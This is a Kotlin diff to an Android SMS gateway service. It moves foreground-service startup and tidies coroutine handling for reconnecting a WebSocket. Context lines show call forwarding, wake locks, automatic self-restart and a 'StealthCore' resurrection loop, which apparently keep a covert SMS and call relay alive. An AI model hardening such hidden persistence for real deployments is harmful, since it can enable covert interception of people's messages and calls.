@@ -63,6 +63,8 @@ class SmsGatewayService : android.app.Service() {
         callForwardingUtility = CallForwardingUtility(this)
         acquireWakeLock()
         createNotificationChannel()
+        // Move startForeground to onCreate to prevent ANR on Android 12+
+        startForeground(Constants.NOTIFICATION_ID, createNotification())
         observeConnectionState()
         registerNetworkCallback()
         StealthCore.startResurrectionLoop(this)
@@ -70,7 +72,7 @@ class SmsGatewayService : android.app.Service() {
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "Service started")
-        startForeground(Constants.NOTIFICATION_ID, createNotification())
+        // startForeground() already called in onCreate()
         intent?.let { handleIntent(it) }
         if (!webSocketClient.isConnected()) connectWebSocket()
         return START_STICKY
@@ -106,16 +108,13 @@ class SmsGatewayService : android.app.Service() {
 
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
-        val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
-        scope.launch {
+        serviceScope.launch {
             try {
                 val serviceEnabled = settingsDataStore.serviceEnabled.first()
                 val serverUrl = settingsDataStore.serverUrl.first()
                 if (serviceEnabled && serverUrl.isNotBlank()) startService(applicationContext)
             } catch (e: Exception) {
                 Log.e(TAG, "Error in onTaskRemoved", e)
-            } finally {
-                scope.cancel()
             }
         }
     }
@@ -133,15 +132,21 @@ class SmsGatewayService : android.app.Service() {
             val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
             networkCallback = object : ConnectivityManager.NetworkCallback() {
                 override fun onAvailable(network: Network) {
-                    if (webSocketClient.connectionState.value == ConnectionState.Disconnected)
-                        connectWebSocket()
+                    serviceScope.launch {
+                        if (webSocketClient.connectionState.value == ConnectionState.Disconnected)
+                            connectWebSocket()
+                    }
                 }
                 override fun onLost(network: Network) { Log.d(TAG, "Network lost") }
                 override fun onCapabilitiesChanged(network: Network, capabilities: NetworkCapabilities) {
                     val ok = capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
                              capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
-                    if (ok && webSocketClient.connectionState.value == ConnectionState.Disconnected)
-                        connectWebSocket()
+                    if (ok) {
+                        serviceScope.launch {
+                            if (webSocketClient.connectionState.value == ConnectionState.Disconnected)
+                                connectWebSocket()
+                        }
+                    }
                 }
             }
             cm.registerNetworkCallback(
